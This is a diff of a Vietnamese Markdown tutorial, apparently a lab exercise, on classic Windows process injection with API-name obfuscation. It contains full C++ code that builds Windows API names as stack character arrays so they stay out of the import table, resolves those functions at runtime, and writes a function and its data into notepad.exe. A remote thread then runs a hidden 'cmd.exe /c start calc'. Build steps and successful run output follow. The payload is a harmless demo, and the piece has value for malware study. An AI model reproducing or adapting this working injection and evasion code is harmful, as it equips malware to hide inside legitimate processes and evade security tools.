@@ -46,23 +46,24 @@ Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát 
 #include <string>
 #include <vector>
 
-// 1. Định nghĩa cấu trúc nguyên mẫu con trỏ hàm động nhằm triệt tiêu hoàn toàn bảng IAT tĩnh
+// 1. Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
 typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
 typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
-// Cấu trúc dữ liệu chứa bảng tham số tuyệt đối hóa giải lỗi RIP-Relative
+// Cấu trúc chứa tham số tuyệt đối - Giải pháp hóa giải lỗi RIP-Relative của bài báo
 typedef struct _THREAD_DATA {
     fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng nằm khít cấu trúc
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
 } THREAD_DATA, * PTHREAD_DATA;
 
-// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
-DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
+// 2. Hàm chức năng độc lập vị trí (Position-Independent Function) gánh luồng chạy khi tiêm sang Notepad
+DWORD WINAPI RemoteClassicPayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
+        // Thực thi bằng con trỏ hàm tuyệt đối, né sạch rào cản Import Table
         pData->pWinExec(pData->szCommand, SW_HIDE);
     }
     return 0;
@@ -77,9 +78,9 @@ DWORD GetTargetProcessPID(const std::wstring& procName) {
     if (hSnapshot != INVALID_HANDLE_VALUE) {
         if (Process32FirstW(hSnapshot, &pe32)) {
             do {
-                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { 
-                    pid = pe32.th32ProcessID; 
-                    break; 
+                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
+                    pid = pe32.th32ProcessID;
+                    break;
                 }
             } while (Process32NextW(hSnapshot, &pe32));
         }
@@ -96,13 +97,13 @@ int main() {
     std::wstring targetName = L"notepad.exe";
     DWORD dwPID = GetTargetProcessPID(targetName);
     if (dwPID == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
         std::cin.get();
         return EXIT_FAILURE;
     }
     std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;
 
-    // ĐỘT PHÁ CẤU TRÚC: Nhúng trực tiếp mảng char lên Stack của CPU, triệt tiêu chuỗi hằng số tĩnh
+    // Tránh lưu chuỗi dạng string plain-text, nhúng trực tiếp mảng char lên Stack của CPU
     char k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
     char vAllocName[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
     char wMemName[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
@@ -111,7 +112,7 @@ int main() {
     HMODULE hKernel32 = GetModuleHandleA(k32);
     if (!hKernel32) return EXIT_FAILURE;
 
-    // Phân giải động địa chỉ hàm trực tiếp tại runtime từ bộ nhớ RAM
+    // Phân giải động địa chỉ hàm trực tiếp từ RAM kết hợp ẩn giấu chuỗi
     pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, vAllocName);
     pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, wMemName);
     pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, cThreadName);
@@ -131,7 +132,7 @@ int main() {
     LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
+        std::cerr << "[-] VirtualAllocEx tu xa that bai!" << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
@@ -143,23 +144,24 @@ int main() {
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
     // Đẩy song song logic hàm thực thi và dữ liệu tham số tuyệt đối vào lòng Notepad từ xa
-    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteObfuscatedPayload, functionSize, NULL);
+    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteClassicPayload, functionSize, NULL);
     DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
     std::cout << "[+] Anh xa logic ma may va tham so tuyet doi hoan tat." << std::endl;
 
     // Kích nổ luồng thực thi phụ từ xa thông qua con trỏ hàm động đã được giấu chuỗi
     std::cout << "[*] Dang khoi tao luong CreateRemoteThread an toan..." << std::endl;
     HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
-    
+
     if (hThread) {
         WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
         std::cout << "[+] Classic Code Injection with API Obfuscation Successful!" << std::endl;
         CloseHandle(hThread);
-    } else {
-        std::cerr << "[-] CreateRemoteThread failed! Error Code: " << GetLastError() << std::endl;
+    }
+    else {
+        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
     }
 
-    // Thu hồi vùng nhớ ảo từ xa và dọn dẹp Handle bảo an kịch trần
+    // Thu hồi vùng nhớ và đóng Handle hệ thống triệt để chống Memory Leak
     VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
     VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
     CloseHandle(hProcess);
@@ -182,8 +184,8 @@ int main() {
 1. Đặt thanh công cụ quản lý cấu hình dự án ở chế độ **`Release`** và nền tảng kiến trúc phần cứng chuyên dụng **`x64`**.
 2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, chuyển đổi cấu hình sang cờ tiêu chuẩn **`Multi-threaded (/MT)`** nhằm nhúng tĩnh (Static Linkage) toàn bộ thư viện liên kết động của CRT vào trong cấu trúc file `.exe`.
 
-> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
-> 
+<img width="1001" height="684" alt="image" src="https://github.com/user-attachments/assets/8f5105bb-5a32-4db8-a0be-f875e6a972e4" />
+
 
 3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân phẳng sạch kịch trần.
 
@@ -194,13 +196,13 @@ int main() {
 Khởi hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng tính toàn vẹn của logic ẩn giấu chuỗi chữ tĩnh:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE03_API_Obfuscate.exe
+PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE03_Classic_Code_Injection_API_Obfuscate\x64\Release\Classic_Code_Injection_API_Obfuscate.exe
 ====================================================
 [*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT
 ====================================================
-[+] Da tim thay Notepad.exe voi PID: 23188
-[+] Da che dau chuoi chu va phan giao dong cac API thanh cong.
-[+] Vung nho Code RWX cua payload dat tai: 0x000002B3A4480000
+[+] Da tim thay Notepad.exe voi PID: 4556
+[+] Da che dau chuoi chu va phan giai dong cac API thanh cong.
+[+] Vung nho Code RWX cua payload dat tai: 0x0000028628300000
 [+] Anh xa logic ma may va tham so tuyet doi hoan tat.
 [*] Dang khoi tao luong CreateRemoteThread an toan...
 [+] Classic Code Injection with API Obfuscation Successful!
@@ -209,8 +211,9 @@ PS C:\Workspace\x64\Release> .\PE03_API_Obfuscate.exe
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm ẩn giấu API:**
-> 
+### Demo
+<img width="1920" height="1140" alt="devenv_jaQDjbU0dJ" src="https://github.com/user-attachments/assets/407a68dc-b2d5-4054-a40f-4512ad7ec70b" />
+
 
 ### 🎯 Phân tích hệ quả RAM & Tĩnh:
 
